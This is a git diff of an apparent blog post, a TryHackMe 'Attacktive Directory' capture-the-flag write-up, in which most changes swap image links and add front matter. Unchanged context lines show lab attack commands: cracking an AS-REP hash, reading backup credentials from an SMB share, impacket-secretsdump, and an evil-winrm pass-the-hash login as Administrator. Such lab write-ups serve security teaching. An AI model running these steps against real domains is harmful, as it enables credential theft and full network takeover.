@@ -2,6 +2,10 @@
 # the default layout is 'page'
 icon: fas fa-info-circle
 order: 4
+
+date: 2024-05-05
+categories: Tryhackme
+image: https://tryhackme-images.s3.amazonaws.com/room-icons/f38b047a2a7089147766099dffeb8a5d.png
 ---
 <!-- icon 	order
 fas fa-info-circle -->
@@ -137,7 +141,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:ab26d8d89927724852bd1c0d655dfe1d$844cd55
 fa13a970800ab4e4d01578ae5223956f7988b0b1c253cf3d4fdadfbfa857cbeca2de93f43d11948c7e12ba101d75817e885dff5ab315e0c51355cb4b2ee27d62a0b77a5a8c6085d200f59398784758cba1126ee3169819d6ddff3d423d5a56
 1486c5b2b292bc9455b76d24aea79d27f6d54c7f37cb4da68749717cf80b25ffce128332aa407088907374a82e7e525e133105c5e5ae56ba63c9f5133191e5ce378ce719384145297c872934d7ebde3a6861c0854c9ccd37a
 ```
-![Alt text](image.png)
+![Screenshot](../../../assets/screenshots/Attactive-Directory/1.webp)
 
 Cracking the hash using john
 
@@ -182,11 +186,11 @@ The backup share looks iinteresting lets access it and see whats in
 smbclient //10.10.141.170/backup -U svc-admin
 ```
 
-![image.png](attachment:ea86cfb1-402e-46d5-aff9-9cdadb9b3348:image.png)
+![Screenshot](../../../assets/screenshots/Attactive-Directory/2.webp)
 
 We got the `backup_credentials.txt` file and downloaded to our local machine..now lets see what does it have
 
-![image.png](attachment:e924096e-1bbf-4114-9434-e97229ab5290:image.png)
+![Screenshot](../../../assets/screenshots/Attactive-Directory/3.webp)
 
 ```php
 backup@spookysec.local:backup2517860                                                                                                                                                     
@@ -198,7 +202,7 @@ Lets go and dump the secrets using this backup account
 impacket-secretsdump backup@10.10.141.170
 ```
 
-![image.png](attachment:56db51b8-9589-44db-b48c-9603d72e8c47:image.png)
+![Screenshot](../../../assets/screenshots/Attactive-Directory/4.webp)
 
 ```php
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                            
@@ -285,7 +289,7 @@ Now as we have the hash especially the Administrator we can login using pass-the
 evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 ```
 
-![image.png](attachment:30d3d165-9729-4595-82cf-9ad822164298:image.png)
+![Screenshot](../../../assets/screenshots/Attactive-Directory/5.webp)
 
 Now go for the flags
 
@@ -308,12 +312,12 @@ We have bunch of users here..now lets read them to get the remaining flags
 
 ## For backup
 
-![image.png](attachment:0eda825b-ff14-4a17-af7d-0475db361fe6:image.png)
+![Screenshot](../../../assets/screenshots/Attactive-Directory/6.webp)
 
 # For svc-admin
 
-![image.png](attachment:cd50ca24-8360-40b3-9a0f-c46a8c3310cc:image.png)
+![Screenshot](../../../assets/screenshots/Attactive-Directory/7.webp)
 
 # Boom..!!
 
-![image.png](attachment:c9d34e05-3544-4a66-bbfe-7f5fc5ce1906:image.png)
+![Screenshot](../../../assets/screenshots/Attactive-Directory/8.webp)
